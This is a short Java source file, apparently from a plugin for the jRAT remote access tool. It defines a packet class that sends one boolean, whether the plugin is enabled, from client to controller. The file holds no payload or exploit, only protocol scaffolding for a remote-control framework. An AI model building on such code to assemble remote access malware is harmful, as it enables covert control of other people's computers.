package jrat.plugin.dwl.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.PacketBuilder;
import jrat.api.Client;

public class Packet extends PacketBuilder {

	public Packet(Client rat) {
		super(DWLPlugin.HEADER, rat);
	}

	@Override
	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		dos.writeBoolean(DWLPlugin.enabled);
	}

}
